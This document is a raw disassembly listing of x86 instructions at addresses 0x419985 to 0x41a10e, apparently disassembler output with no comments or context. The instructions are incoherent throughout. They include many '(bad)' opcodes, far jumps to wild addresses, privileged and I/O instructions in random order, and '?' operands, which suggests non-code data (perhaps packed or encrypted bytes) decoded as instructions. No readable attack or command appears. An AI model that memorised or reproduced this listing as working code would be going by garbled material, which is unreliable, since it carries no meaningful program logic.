  419985:	or     dl,BYTE PTR [esi+0x75]
  419988:	add    cl,BYTE PTR [eax+0x5180c4e4]
  41998e:	mov    dl,0xc5
  419990:	ss (bad) 
  419992:	test   al,0xc3
  419994:	mov    DWORD PTR [esi-0x2],edx
  419997:	pop    ebp
  419998:	cwde   
  419999:	repz sbb eax,0x75ae8ccc
  41999f:	add    DWORD PTR [esi-0x5d],edi
  4199a2:	push   esp
  4199a3:	adc    bl,ah
  4199a5:	mov    ebp,0x96539ecf
  4199aa:	push   esp
  4199ab:	inc    ecx
  4199ac:	mov    ebx,ebp
  4199ae:	xor    DWORD PTR [edx-0x5db66667],esp
  4199b4:	push   es
  4199b5:	ds aas 
  4199b7:	mov    ds:0x58a342bf,al
  4199bc:	jmp    0x44595fba
  4199c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199c2:	sbb    bh,BYTE PTR [esi]
  4199c4:	adc    esp,esp
  4199c6:	cmc    
  4199c7:	hlt    
  4199c8:	xor    esp,DWORD PTR [ecx+0x7773cda8]
  4199ce:	sub    DWORD PTR [ecx-0x58333640],ebx
  4199d4:	addr16 xchg esp,eax
  4199d6:	fcmovnbe st,st(0)
  4199d8:	mov    al,0x89
  4199da:	pop    es
  4199db:	enter  0x3c2a,0x9d
  4199df:	out    0xb5,eax
  4199e1:	push   es
  4199e2:	arpl   WORD PTR [ecx-0x68],bx
  4199e5:	or     DWORD PTR [eax+0x654e5463],ebx
  4199eb:	popa   
  4199ec:	add    DWORD PTR [ebp+0x4],edx
  4199ef:	sub    al,0x41
  4199f1:	add    al,0x31
  4199f3:	sub    ebx,esp
  4199f5:	sub    bl,BYTE PTR [eax]
  4199f7:	out    dx,al
  4199f8:	pop    esi
  4199f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199fa:	cli    
  4199fb:	arpl   cx,bx
  4199fd:	test   BYTE PTR fs:[eax+esi*2],dl
  419a01:	mov    edx,0x75880378
  419a06:	jae    0x419a7d
  419a08:	(bad)  [ebp+0x45]
  419a0b:	jecxz  0x419998
  419a0d:	call   0xc189455e
  419a12:	jo     0x419a50
  419a14:	pop    es
  419a15:	mov    bh,0xc9
  419a17:	cmovl  edi,DWORD PTR [ebp+eax*1+0x14ba5041]
  419a1f:	pop    edx
  419a20:	sub    ecx,edi
  419a22:	xchg   ebp,eax
  419a23:	in     eax,dx
  419a24:	fadd   DWORD PTR [esi-0x44]
  419a27:	and    eax,0x3f7741f
  419a2c:	jmp    0xbaa0fb67
  419a31:	repnz mov dl,0x1b
  419a34:	(bad)  
  419a35:	(bad)  
  419a36:	pop    ds
  419a37:	test   eax,0xe1c828c
  419a3c:	xor    ch,dl
  419a3e:	(bad)  
  419a3f:	fs (bad) 
  419a42:	sti    
  419a43:	or     DWORD PTR [eax],0xb9581178
  419a49:	dec    edx
  419a4a:	popf   
  419a4b:	cmp    BYTE PTR [eax+0x3c],dl
  419a4e:	push   ebp
  419a4f:	pushf  
  419a50:	call   0x1d90:0x9848d7fc
  419a57:	xchg   ebx,eax
  419a58:	inc    esp
  419a59:	out    dx,al
  419a5a:	mov    bh,0x30
  419a5c:	mov    cl,0x68
  419a5e:	pop    ecx
  419a5f:	fs mov bh,0x2b
  419a62:	(bad)  
  419a63:	arpl   WORD PTR [edi+0x5b],di
  419a66:	arpl   WORD PTR [eax+0x76],di
  419a69:	pusha  
  419a6a:	inc    edi
  419a6b:	ja     0x419aba
  419a6d:	lock mov cs,WORD PTR [ebx]
  419a70:	jne    0x419a87
  419a72:	loop   0x419ae1
  419a74:	jg     0x419a92
  419a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a77:	inc    eax
  419a78:	ret    
  419a79:	and    BYTE PTR [ecx],0xa2
  419a7c:	cld    
  419a7d:	std    
  419a7e:	rcr    BYTE PTR [esi+0x60],cl
  419a81:	push   edx
  419a82:	xchg   edx,eax
  419a83:	jne    0x419a9d
  419a85:	dec    ebx
  419a86:	sti    
  419a87:	pop    es
  419a88:	ins    DWORD PTR es:[edi],dx
  419a89:	pop    edi
  419a8a:	gs jo  0x419a38
  419a8d:	dec    esp
  419a8e:	lods   al,BYTE PTR ds:[esi]
  419a8f:	push   esi
  419a90:	pop    ds
  419a91:	mov    eax,ds:0xeeddcc5e
  419a96:	pop    ebx
  419a97:	push   esi
  419a98:	dec    eax
  419a99:	dec    ebp
  419a9a:	mov    al,ds:0xf73d7ed2
  419a9f:	add    DWORD PTR [ebx-0x46ddd0a6],edx
  419aa5:	popf   
  419aa6:	nop
  419aa7:	sub    al,0xfa
  419aa9:	push   ebx
  419aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aab:	and    ch,BYTE PTR [eax]
  419aad:	sar    DWORD PTR [edx-0x2f],0xd4
  419ab1:	or     al,0x53
  419ab3:	push   0x5c
  419ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ab6:	adc    BYTE PTR [ecx-0x32],dh
  419ab9:	je     0x419aa2
  419abb:	call   0x90c3e7f9
  419ac0:	pop    es
  419ac1:	push   ds
  419ac2:	mov    eax,ds:0x53cdc539
  419ac7:	lock mov ebx,0x6c9ae2b7
  419acd:	mov    bh,0xcb
  419acf:	adc    eax,0x9e8975ac
  419ad4:	popf   
  419ad5:	sbb    eax,0x18d953de
  419ada:	pop    eax
  419adb:	ds (bad) 
  419add:	add    ebp,DWORD PTR [ebx]
  419adf:	and    al,BYTE PTR [ecx]
  419ae1:	mov    WORD PTR [esp+esi*2],fs
  419ae4:	pop    esi
  419ae5:	pop    edx
  419ae6:	pop    eax
  419ae7:	or     al,0x7d
  419aea:	aad    0x40
  419aec:	xor    esi,eax
  419aee:	scas   eax,DWORD PTR es:[edi]
  419aef:	mov    eax,cs
  419af1:	sbb    BYTE PTR [ebp-0x338ae44b],dh
  419af7:	xor    esi,DWORD PTR [ecx]
  419af9:	adc    BYTE PTR [ecx-0x1d],ch
  419afc:	(bad)  
  419afd:	xchg   DWORD PTR [ecx-0x76214b2d],eax
  419b03:	mov    ch,0x20
  419b06:	xchg   esi,eax
  419b07:	stos   DWORD PTR es:[edi],eax
  419b08:	scas   eax,DWORD PTR es:[edi]
  419b09:	rcr    BYTE PTR [ebp+0x7b8e4e26],0xfa
  419b10:	fidiv  DWORD PTR [esi+0x292ecdc7]
  419b16:	arpl   bp,si
  419b18:	jne    0x419b5c
  419b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b1b:	jecxz  0x419b5c
  419b1d:	push   esi
  419b1e:	retf   
  419b1f:	mov    dh,0xa3
  419b21:	and    BYTE PTR ds:0x46d02ba9,bl
  419b27:	inc    esi
  419b28:	stc    
  419b29:	pop    ss
  419b2a:	int3   
  419b2b:	fcom   DWORD PTR [eax+0x5d6d7d10]
  419b31:	xchg   DWORD PTR [ecx+ecx*4],edi
  419b34:	shl    ecx,1
  419b36:	mov    eax,ds:0x4b9ce528
  419b3b:	sub    ebp,edx
  419b3d:	or     edx,DWORD PTR [esi]
  419b3f:	mov    ch,0xc7
  419b41:	pop    ds
  419b42:	xor    eax,0x5838c01e
  419b47:	bound  edi,QWORD PTR [edi+0x4cdb3da1]
  419b4d:	jns    0x419acf
  419b4f:	in     eax,dx
  419b50:	sbb    BYTE PTR [edx-0xf90ad8c],cl
  419b56:	and    BYTE PTR [edi+0x2e],dl
  419b59:	push   eax
  419b5a:	cmc    
  419b5b:	xor    esp,DWORD PTR [ebx+0x27]
  419b5e:	cld    
  419b5f:	cmp    ecx,DWORD PTR [ebx+0x4b3040fa]
  419b65:	or     eax,0xeb3fb55c
  419b6a:	mov    edi,DWORD PTR [edx-0x7655ad3e]
  419b70:	mov    ecx,0x4fcf4414
  419b75:	outs   dx,BYTE PTR ds:[esi]
  419b76:	and    BYTE PTR [eax],cl
  419b78:	je     0x419ba5
  419b7a:	jle    0x419b0e
  419b7c:	xor    DWORD PTR [esi+ebx*8],esp
  419b7f:	call   DWORD PTR [esp+edi*2-0x3f]
  419b83:	push   0x9c8ce95d
  419b88:	sti    
  419b89:	mov    cl,0x38
  419b8b:	clc    
  419b8c:	test   DWORD PTR [ecx-0x72],esp
  419b8f:	fwait
  419b90:	jns    0x419bb2
  419b92:	jmp    0x419b30
  419b94:	jg     0x419bfe
  419b96:	stos   DWORD PTR es:[edi],eax
  419b97:	xor    ah,ah
  419b99:	mov    BYTE PTR [eax+eiz*2-0x46],bl
  419b9d:	adc    DWORD PTR [edi],ebx
  419b9f:	cwde   
  419ba0:	leave  
  419ba1:	mov    ch,0x2d
  419ba3:	aad    0x8e
  419ba5:	repnz aas 
  419ba7:	adc    ah,bl
  419ba9:	test   DWORD PTR [edi-0x433a39aa],ebx
  419baf:	iret   
  419bb0:	fwait
  419bb1:	add    dl,ah
  419bb3:	add    al,BYTE PTR [eax]
  419bb5:	repz or esi,DWORD PTR [ebx+0x5f]
  419bb9:	ds mov cl,0xf2
  419bbc:	cmc    
  419bbd:	and    DWORD PTR [eax-0x27],0xffffffd2
  419bc1:	enter  0xdd44,0xa5
  419bc5:	sar    edi,1
  419bc7:	out    dx,eax
  419bc8:	div    DWORD PTR [ecx+0x63]
  419bcb:	sar    dl,1
  419bcd:	mov    ah,0x36
  419bcf:	fist   DWORD PTR [eax+0x42]
  419bd2:	push   0x114054af
  419bd7:	imul   edx,DWORD PTR [edx+0x17],0xd7dd525d
  419bde:	lods   al,BYTE PTR ds:[esi]
  419bdf:	mov    ds:0x7066201b,al
  419be4:	cmp    bh,BYTE PTR [ecx]
  419be6:	add    BYTE PTR [eax-0x45],ch
  419be9:	cmp    eax,0x4e4d249c
  419bee:	push   ebx
  419bef:	push   esi
  419bf0:	jmp    0x41a17a
  419bf5:	in     al,0xf8
  419bf7:	inc    esi
  419bf8:	scas   eax,DWORD PTR es:[edi]
  419bf9:	sbb    ch,BYTE PTR [eax]
  419bfb:	push   esp
  419bfc:	mov    eax,0x72b8fca1
  419c01:	mov    DWORD PTR [edi+0x3b21682e],ecx
  419c07:	or     al,0x16
  419c09:	cmp    eax,0xb161604
  419c0e:	stc    
  419c0f:	test   eax,0x6739aa1e
  419c14:	mov    dl,0xb5
  419c16:	leave  
  419c17:	out    dx,eax
  419c18:	test   BYTE PTR [ebx],ch
  419c1a:	jg     0x419bd6
  419c1c:	js     0x419be0
  419c1e:	dec    edx
  419c1f:	xor    cl,BYTE PTR [edx]
  419c21:	(bad)  
  419c22:	gs cmp dh,bh
  419c25:	cli    
  419c26:	and    esp,DWORD PTR [eax-0x5031040a]
  419c2c:	cmp    al,0x64
  419c2e:	xchg   DWORD PTR [esi+0xd1f54b9],ebx
  419c34:	adc    eax,0x7458d11c
  419c39:	fstp   QWORD PTR [ecx-0x57]
  419c3c:	push   cs
  419c3d:	jle    0x419c93
  419c3f:	int3   
  419c40:	jmp    0x419cad
  419c42:	adc    bh,al
  419c44:	adc    eax,0x424ad88
  419c49:	cmp    DWORD PTR [ebx+0x74e6699c],0x536cedfb
  419c53:	push   ecx
  419c54:	xchg   ecx,eax
  419c55:	push   ss
  419c56:	xchg   ebx,ebx
  419c58:	cmp    eax,0xf0b69f82
  419c5d:	or     eax,DWORD PTR [esi+0x34]
  419c60:	or     DWORD PTR [ecx],eax
  419c62:	data16 mov bh,0xc6
  419c65:	add    BYTE PTR [esi+ebx*2-0x19919ed6],dh
  419c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c6d:	out    dx,eax
  419c6e:	fiadd  WORD PTR [edi+ebp*8]
  419c71:	jbe    0x419c3c
  419c73:	mov    cl,0x93
  419c75:	add    DWORD PTR [ecx],edx
  419c77:	mov    al,0x25
  419c79:	mov    ds:0xcf50a7ac,al
  419c7e:	fdivrp st(7),st
  419c80:	jnp    0x419c28
  419c82:	pop    ebx
  419c83:	icebp  
  419c84:	or     DWORD PTR [ebx],esi
  419c86:	test   esi,eax
  419c88:	das    
  419c89:	int3   
  419c8a:	cmp    esp,esp
  419c8c:	rcr    DWORD PTR [ebp-0x3e],0x95
  419c90:	(bad)  
  419c91:	jne    0x419ced
  419c93:	loopne 0x419c5f
  419c95:	push   ecx
  419c96:	and    al,0xc8
  419c98:	mov    eax,0xd5e7f4d1
  419c9d:	sbb    edi,DWORD PTR [ebx+edi*8-0xc99f02]
  419ca4:	push   es
  419ca5:	shr    ecx,1
  419ca7:	mov    eax,ds:0xa2cf3551
  419cac:	int    0xd7
  419cae:	in     eax,dx
  419caf:	mov    esi,0x8791ba46
  419cb4:	jl     0x419c9f
  419cb6:	pop    ss
  419cb7:	sbb    al,0x4c
  419cb9:	sub    eax,0x846df509
  419cbe:	clc    
  419cbf:	fbld   TBYTE PTR [esi-0x33]
  419cc2:	mov    ss,WORD PTR [edx+0x5b48e98]
  419cc8:	stos   BYTE PTR es:[edi],al
  419cc9:	rcr    BYTE PTR [ecx-0x41dd5354],0xdb
  419cd0:	mov    esi,0x8e270d9b
  419cd5:	jae    0x419d25
  419cd7:	je     0x419cd8
  419cd9:	enter  0x23e4,0x99
  419cdd:	jne    0x419cd8
  419cdf:	xor    DWORD PTR [ebx+0x3d],0x84433e57
  419ce6:	in     eax,0x2f
  419ce8:	stc    
  419ce9:	jl     0x419cda
  419ceb:	and    al,0x76
  419ced:	jo     0x419d5a
  419cef:	mov    ecx,0xf1c12aca
  419cf4:	sbb    eax,0x23f326c9
  419cf9:	fld    TBYTE PTR [ebx]
  419cfb:	jl     0x419cbf
  419cfd:	ins    DWORD PTR es:[edi],dx
  419cfe:	mov    dh,0x55
  419d00:	pop    ecx
  419d01:	mov    dl,0xe1
  419d03:	jnp    0x419d74
  419d05:	push   0x4b
  419d07:	call   FWORD PTR [esi]
  419d09:	ret    
  419d0a:	and    esi,DWORD PTR [eax]
  419d0c:	push   ebp
  419d0d:	jno    0x419d71
  419d0f:	into   
  419d10:	xchg   edi,eax
  419d11:	mov    ds:0xa5dc358f,al
  419d16:	loop   0x419d95
  419d18:	es sahf 
  419d1a:	int    0x2
  419d1c:	mov    ebp,0x53114bdc
  419d21:	(bad)  
  419d22:	(bad)  
  419d23:	mov    edx,0x639519de
  419d28:	jno    0x419cf5
  419d2a:	and    DWORD PTR [edx-0x5e8b6865],eax
  419d30:	pop    ds
  419d31:	fistp  QWORD PTR [ebx+0x37d66f81]
  419d37:	mov    BYTE PTR [ebx+0x52],ch
  419d3a:	adc    eax,0x9778a710
  419d3f:	shr    DWORD PTR [edx-0x5fcca8da],0x52
  419d46:	pop    ebp
  419d47:	dec    edi
  419d48:	push   ebp
  419d49:	push   ebp
  419d4a:	stc    
  419d4b:	inc    esp
  419d4c:	cmp    DWORD PTR [eax-0x6f],esi
  419d4f:	in     al,dx
  419d50:	outs   dx,BYTE PTR ds:[esi]
  419d51:	sub    al,0x9b
  419d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d54:	cmp    cl,BYTE PTR ds:0xa277e23a
  419d5a:	push   ecx
  419d5b:	jmp    0x419dc1
  419d5d:	mov    edx,DWORD PTR [esi]
  419d5f:	dec    edi
  419d60:	dec    esp
  419d61:	jmp    0xc51c3753
  419d66:	popf   
  419d67:	xor    BYTE PTR [edx-0x68364395],bh
  419d6d:	shl    DWORD PTR [edi-0x16f7dbeb],0x5a
  419d74:	loope  0x419dc0
  419d76:	std    
  419d77:	stos   DWORD PTR es:[edi],eax
  419d78:	test   BYTE PTR [eax-0x7],bh
  419d7b:	out    dx,al
  419d7c:	out    dx,eax
  419d7d:	ret    0xfe1
  419d80:	outs   dx,DWORD PTR ds:[esi]
  419d81:	ins    BYTE PTR es:[edi],dx
  419d82:	xchg   edi,eax
  419d83:	cmp    eax,0xcbe3870
  419d88:	sbb    DWORD PTR [edx],edx
  419d8a:	(bad)  
  419d8b:	cmp    al,0x2a
  419d8d:	inc    esp
  419d8e:	jmp    0xa39f:0xf8df642b
  419d95:	lahf   
  419d96:	mov    ?,WORD PTR [eax+0x26a93133]
  419d9c:	ins    DWORD PTR es:[edi],dx
  419d9d:	jg     0x419d59
  419d9f:	rol    DWORD PTR [esi+0x3],1
  419da2:	popa   
  419da3:	cmovno ebp,DWORD PTR [ebx+0x4715e6a5]
  419daa:	stos   DWORD PTR es:[edi],eax
  419dab:	mov    ds:0xc5f2d8dc,al
  419db0:	clc    
  419db1:	xchg   edi,eax
  419db2:	retf   
  419db3:	imul   ebp,DWORD PTR [ebp-0x9],0x3291b305
  419dba:	sti    
  419dbb:	lock stos BYTE PTR es:[edi],al
  419dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dbe:	push   ds
  419dbf:	adc    edi,0xffffff96
  419dc2:	push   ss
  419dc3:	repnz arpl WORD PTR [edx],bp
  419dc6:	lock pusha 
  419dc8:	getsec 
  419dca:	inc    edx
  419dcb:	push   0x15
  419dcd:	or     eax,0x58f1d586
  419dd2:	xor    DWORD PTR [eax-0x5f],0x6b7508b4
  419dd9:	mov    cl,0x8f
  419ddb:	loop   0x419dd5
  419ddd:	and    eax,0xbedda526
  419de2:	les    eax,FWORD PTR [esi-0x10]
  419de5:	(bad)  
  419de6:	pop    ds
  419de7:	mov    bh,0x13
  419de9:	mov    cl,BYTE PTR [eax-0x386c69af]
  419def:	xchg   esp,eax
  419df0:	sbb    eax,0x84dc184
  419df5:	sub    BYTE PTR [eax],dh
  419df7:	arpl   WORD PTR [esi],ax
  419df9:	int3   
  419dfa:	bound  esi,QWORD PTR [ebp-0x3d]
  419dfd:	popa   
  419dfe:	in     eax,dx
  419dff:	(bad)  
  419e01:	push   edi
  419e02:	dec    ebx
  419e03:	or     ecx,DWORD PTR [esi-0x7d]
  419e06:	and    ah,ch
  419e08:	mov    bh,0xc2
  419e0a:	pop    edx
  419e0b:	xchg   edx,eax
  419e0c:	in     eax,dx
  419e0d:	cli    
  419e0e:	popf   
  419e0f:	ins    BYTE PTR es:[edi],dx
  419e10:	mov    cl,0x21
  419e12:	in     al,0xba
  419e14:	pop    ecx
  419e15:	retf   
  419e16:	pop    ebp
  419e17:	jno    0x419dad
  419e19:	mov    esi,0x80ad2137
  419e1e:	sbb    al,0x66
  419e20:	les    edx,FWORD PTR [ecx]
  419e22:	cmc    
  419e23:	inc    edi
  419e24:	sar    BYTE PTR [eax-0x2151cc3],cl
  419e2a:	mov    ecx,0xf00cb164
  419e2f:	test   DWORD PTR [esp+edi*4],0xaee5712f
  419e36:	push   edx
  419e37:	and    edi,DWORD PTR [ebx-0x47]
  419e3a:	cmp    eax,0x1c7d0c4b
  419e3f:	dec    esi
  419e40:	sub    al,ch
  419e42:	mov    bh,0xdb
  419e44:	cdq    
  419e45:	sub    bl,bl
  419e47:	fxch   st(0)
  419e49:	jge    0x419dd8
  419e4b:	fdivr  DWORD PTR [edi-0x181c0544]
  419e51:	pop    ss
  419e52:	ret    0xf2da
  419e55:	mov    ss:0x8795e55c,eax
  419e5b:	xchg   ebp,eax
  419e5c:	jmp    0x1d5a85f2
  419e61:	sahf   
  419e62:	sbb    BYTE PTR [esp+ebx*1],bl
  419e65:	icebp  
  419e66:	pop    ebp
  419e67:	sbb    ecx,DWORD PTR [esi+0x43]
  419e6a:	adc    BYTE PTR [ebx],cl
  419e6c:	leave  
  419e6d:	mov    ebp,0xfa2cc5a
  419e72:	loopne 0x419e05
  419e74:	mov    ecx,0xc71acf1a
  419e79:	inc    esp
  419e7a:	outs   dx,BYTE PTR ds:[esi]
  419e7b:	div    edi
  419e7d:	mov    ss,WORD PTR [ebx+ebp*4+0x27ba1bc8]
  419e84:	xor    edi,DWORD PTR [esi]
  419e86:	inc    edx
  419e87:	lea    esi,[ecx+eax*8-0x34]
  419e8b:	mov    esi,0xffdbf8d9
  419e90:	or     eax,0x6262b014
  419e95:	addr16 push cs
  419e97:	sub    eax,0x8faafd54
  419e9c:	arpl   WORD PTR [eax-0x16],sp
  419e9f:	icebp  
  419ea0:	push   cs
  419ea1:	pop    ebx
  419ea2:	pop    edi
  419ea3:	test   BYTE PTR [ebx-0x1b717af],al
  419ea9:	or     bl,al
  419eab:	cwde   
  419eac:	mov    esp,0xcfb9726b
  419eb1:	(bad)  
  419eb2:	out    0xa5,al
  419eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eb5:	sub    bh,dh
  419eb7:	mov    ds:0x4c425efd,al
  419ebc:	sar    cl,cl
  419ebe:	push   esp
  419ebf:	adc    al,0x4f
  419ec1:	jnp    0x419f13
  419ec3:	and    BYTE PTR [edi],bl
  419ec5:	aaa    
  419ec6:	and    eax,0x70d9f8ca
  419ecb:	sub    DWORD PTR [ecx],esp
  419ecd:	inc    esi
  419ece:	bound  ecx,QWORD PTR [edi-0x7d]
  419ed1:	das    
  419ed2:	outs   dx,BYTE PTR ds:[esi]
  419ed3:	mov    DWORD PTR [esi-0x541415d8],ebx
  419ed9:	sar    BYTE PTR [edx],0x8e
  419edc:	mov    BYTE PTR [esi],bl
  419ede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419edf:	fistp  QWORD PTR [edi+0x2a]
  419ee2:	mov    bh,0x17
  419ee4:	sti    
  419ee5:	sub    BYTE PTR [esi+0x28117d25],dh
  419eeb:	sub    esp,eax
  419eed:	sub    ecx,ecx
  419eef:	pop    esp
  419ef0:	pop    ebx
  419ef1:	cmp    al,0xf6
  419ef3:	push   es
  419ef4:	pop    ecx
  419ef5:	(bad)  
  419ef6:	mov    BYTE PTR [edx],ah
  419ef8:	fldenv ss:[ebx]
  419efb:	push   es
  419efc:	les    edi,FWORD PTR [edi]
  419efe:	shl    BYTE PTR [edx+0x64c0d27e],cl
  419f04:	setno  BYTE PTR [ebp-0x17991fba]
  419f0b:	std    
  419f0c:	xchg   esi,eax
  419f0d:	bound  esp,QWORD PTR [ebx]
  419f0f:	and    eax,0x83b50a56
  419f14:	cmp    bl,dh
  419f16:	add    BYTE PTR [ebx],bl
  419f18:	dec    ecx
  419f19:	test   eax,0x151f2619
  419f1e:	push   ebx
  419f1f:	xchg   ecx,eax
  419f20:	les    ebp,FWORD PTR [esi-0x473e54b1]
  419f26:	mov    bl,0x56
  419f28:	adc    al,0xaa
  419f2a:	int3   
  419f2b:	pushf  
  419f2c:	(bad)  
  419f2d:	cmp    bh,BYTE PTR [ebx+0xa]
  419f30:	jmp    0x419eb2
  419f32:	dec    esi
  419f33:	shl    BYTE PTR [ebp-0x133f3f7e],1
  419f39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f3a:	cmp    eax,0xb4d9bdcc
  419f3f:	inc    esp
  419f40:	push   ebx
  419f41:	and    BYTE PTR [edi+0xd24d69d],dh
  419f47:	mov    edx,0xdae08a57
  419f4c:	jnp    0x419f5b
  419f4e:	iret   
  419f4f:	repz sahf 
  419f51:	popa   
  419f52:	inc    edi
  419f53:	dec    esp
  419f54:	dec    esi
  419f55:	shl    BYTE PTR [ecx],1
  419f57:	hlt    
  419f58:	cmp    al,0xe8
  419f5a:	ins    DWORD PTR es:[edi],dx
  419f5b:	mov    ds:0x30cd169c,al
  419f60:	scas   al,BYTE PTR es:[edi]
  419f61:	jne    0x419f14
  419f63:	xor    eax,0xdd3b3a36
  419f68:	or     cl,BYTE PTR [eax+0x6f]
  419f6b:	cdq    
  419f6c:	dec    ecx
  419f6d:	xor    eax,0xeb5750ec
  419f72:	aas    
  419f73:	dec    ecx
  419f74:	outs   dx,BYTE PTR ds:[esi]
  419f75:	add    BYTE PTR [edi+0x3903fe6d],ch
  419f7b:	aas    
  419f7c:	arpl   WORD PTR [esi-0x6d],di
  419f7f:	inc    esp
  419f80:	add    al,0xa1
  419f82:	jge    0x419fa7
  419f84:	loop   0x419f4f
  419f86:	jmp    0x2e752d09
  419f8b:	xchg   esp,eax
  419f8c:	mov    al,0x6b
  419f8e:	pop    ebp
  419f8f:	mov    al,0xa0
  419f91:	cli    
  419f92:	jp     0x419f3f
  419f94:	jp     0x419f95
  419f96:	cmp    BYTE PTR [ebx-0x17b23ab2],0x9d
  419f9d:	into   
  419f9e:	xchg   esp,eax
  419f9f:	pop    esp
  419fa0:	sub    eax,0xeab4cf98
  419fa5:	mov    eax,0x8c129b90
  419faa:	mov    WORD PTR [edx],?
  419fac:	mov    ch,0x56
  419fae:	sar    DWORD PTR [ebx+0x148f02dc],cl
  419fb4:	cs push ebp
  419fb6:	mov    bl,0xb4
  419fb8:	retf   
  419fb9:	lahf   
  419fba:	push   0xffffff95
  419fbc:	in     al,dx
  419fbd:	jne    0x419f69
  419fbf:	xor    edx,eax
  419fc1:	dec    edx
  419fc2:	mov    ecx,0xdbfef97
  419fc7:	ins    DWORD PTR es:[edi],dx
  419fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fc9:	in     eax,dx
  419fca:	cmp    esp,eax
  419fcc:	rol    BYTE PTR [edx+ecx*1-0x6f],1
  419fd0:	test   BYTE PTR [edi],ah
  419fd2:	fcomp  DWORD PTR [ecx]
  419fd4:	inc    ecx
  419fd5:	push   cs
  419fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fd7:	cmp    DWORD PTR [edx-0x167803f1],edx
  419fdd:	retf   0x65d2
  419fe0:	in     eax,0xba
  419fe2:	int    0x6d
  419fe4:	int    0xf7
  419fe6:	sub    eax,0x4eda2b5f
  419feb:	or     al,0xd1
  419fed:	call   0xea5b:0x5ce4d4e8
  419ff4:	mov    cl,0xb6
  419ff6:	adc    eax,0x764395f9
  419ffb:	sub    al,0xae
  419ffd:	int    0xa2
  419fff:	ret    0x3ea5
  41a002:	pusha  
  41a003:	jecxz  0x41a055
  41a005:	jb     0xfd6ab161
  41a00b:	ret    0x577a
  41a00e:	mov    dh,0x40
  41a010:	push   esp
  41a011:	and    edi,DWORD PTR [edx-0x6d]
  41a014:	shl    al,0xc7
  41a017:	xor    DWORD PTR [ebx],ecx
  41a019:	mov    eax,ds:0xd2e2e285
  41a01e:	fidiv  DWORD PTR ds:0xf2a1ced6
  41a024:	frstor [eax+0x5a54d636]
  41a02a:	imul   eax,DWORD PTR [eax-0x631233ee],0x3367c96b
  41a034:	pop    ss
  41a035:	es xchg esi,eax
  41a037:	shl    BYTE PTR [eax+0x35540dd1],0x4e
  41a03e:	mov    dl,0xce
  41a040:	test   BYTE PTR [ecx+edi*4+0x43],ah
  41a044:	test   bh,0x3a
  41a047:	jl     0x41a08a
  41a049:	jne    0x41a02d
  41a04b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a04c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a04d:	xchg   ebx,eax
  41a04e:	mov    dl,0x88
  41a050:	call   0xff41f182
  41a055:	dec    eax
  41a056:	inc    esp
  41a057:	aad    0x3a
  41a059:	fimul  DWORD PTR [ecx-0x50]
  41a05c:	lea    esi,[edi-0x521ca859]
  41a062:	ja     0x41a04a
  41a064:	cmc    
  41a065:	sbb    ch,bh
  41a067:	pop    ds
  41a068:	sbb    ecx,edi
  41a06a:	push   eax
  41a06b:	sbb    ebp,eax
  41a06d:	jne    0x41a014
  41a06f:	(bad)  
  41a070:	mov    ds:0x4381e012,al
  41a075:	bound  edi,QWORD PTR [edx+0x8b39f7]
  41a07b:	xchg   ebp,eax
  41a07c:	jne    0x41a04f
  41a07e:	jl     0x41a05d
  41a080:	mov    dh,0x31
  41a082:	shr    BYTE PTR [esi],1
  41a084:	inc    edx
  41a085:	adc    dl,BYTE PTR [eax]
  41a087:	loop   0x41a03e
  41a089:	lock push esi
  41a08b:	gs mov ebp,0x1794784a
  41a091:	and    dh,BYTE PTR [edi]
  41a093:	mov    edx,0xd8fdb4bd
  41a098:	ret    
  41a099:	mov    ah,0xad
  41a09b:	daa    
  41a09c:	pushf  
  41a09d:	push   0xffffff89
  41a09f:	ss pushf 
  41a0a1:	sub    eax,0x34f29eb2
  41a0a6:	push   ds
  41a0a7:	and    BYTE PTR [eax+edx*8-0x69],ch
  41a0ab:	pop    ebp
  41a0ac:	js     0x41a04e
  41a0ae:	loopne 0x41a0a2
  41a0b0:	sbb    al,0x41
  41a0b2:	or     al,0x7
  41a0b4:	xor    eax,0x22cd2e07
  41a0b9:	cld    
  41a0ba:	dec    eax
  41a0bb:	jmp    0x41a0e5
  41a0bd:	loopne 0x41a0ac
  41a0bf:	sbb    dh,BYTE PTR [ebx+0x37601961]
  41a0c5:	(bad)  
  41a0c6:	jns    0x41a07d
  41a0c8:	retf   
  41a0c9:	adc    al,0xd4
  41a0cb:	push   ebx
  41a0cc:	ins    BYTE PTR es:[edi],dx
  41a0cd:	mov    ebp,edi
  41a0cf:	or     al,0x7
  41a0d1:	xor    ch,BYTE PTR [eax]
  41a0d3:	mov    esi,DWORD PTR [edi+0x5f]
  41a0d6:	mov    ah,0x25
  41a0d8:	(bad)  
  41a0d9:	fsub   DWORD PTR [ebx]
  41a0db:	out    0x3f,al
  41a0dd:	and    DWORD PTR [eax],ecx
  41a0df:	cmc    
  41a0e0:	adc    edx,esp
  41a0e2:	xchg   DWORD PTR [ecx+esi*1+0x7ffc2d56],ebx
  41a0e9:	cmp    eax,0xdf7e210e
  41a0ee:	call   0x88726c54
  41a0f3:	sbb    dl,bl
  41a0f5:	lods   al,BYTE PTR ds:[esi]
  41a0f6:	dec    ecx
  41a0f7:	dec    edi
  41a0f8:	out    dx,eax
  41a0f9:	sbb    ah,BYTE PTR [ebx+ebp*8]
  41a0fc:	std    
  41a0fd:	iret   
  41a0fe:	fsub   DWORD PTR [edi-0x20d38322]
  41a104:	inc    edx
  41a105:	sub    ch,BYTE PTR [ecx-0x73663399]
  41a10b:	jp     0x41a126
  41a10d:	outs   dx,BYTE PTR ds:[esi]
  41a10e:	(bad)  
